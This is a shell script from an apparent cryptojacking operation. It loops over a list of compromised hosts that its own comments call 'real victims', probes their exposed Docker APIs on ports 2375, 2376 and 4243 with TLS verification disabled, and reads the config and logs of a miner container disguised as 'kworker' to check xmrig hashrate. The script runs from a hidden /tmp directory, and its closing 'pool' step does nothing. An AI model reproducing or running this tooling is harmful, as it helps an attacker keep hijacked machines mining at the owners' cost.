#!/bin/sh
# Why is per-machine hashrate low? Show what our container is actually told to run
# and what xmrig reports as its own speed on real victims.
cd /tmp/.sysd/.hunt || exit 1
for ip in $(cut -f1 dock.owned | sort -u | head -6); do
  for p in 2375 2376 4243; do
    case $p in 2376) s=https; o=-k;; *) s=http; o="";; esac
    v=$(curl -fsS $o -m 3 "$s://$ip:$p/version" 2>/dev/null) || continue
    case "$v" in *ApiVersion*) ;; *) continue;; esac
    echo "== $ip:$p"
    j=$(curl -fsS $o -m 6 "$s://$ip:$p/containers/kworker/json" 2>/dev/null)
    echo "   image=$(printf '%s' "$j" | grep -o '"Image":"[^"]*"' | head -1)"
    echo "   cmd=$(printf '%s' "$j" | grep -o '"Cmd":\[[^]]*\]' | head -1)"
    echo "   cpucores=$(printf '%s' "$j" | grep -o '"CpuShares":[0-9]*' | head -1)  ncpu_host_unknown"
    echo "   host_cpus=$(printf '%s' "$j" | grep -o '"NanoCpus":[0-9]*' | head -1)"
    curl -fsS $o -m 8 "$s://$ip:$p/containers/kworker/logs?stdout=1&stderr=1&tail=120" 2>/dev/null \
        | tr -d '\000' | grep -e 'speed' -e 'huge pages' -e 'cpu' | tail -3 | sed 's/^/     /'
    break
  done
done
echo "--- pool:"
grep -e '' /dev/null
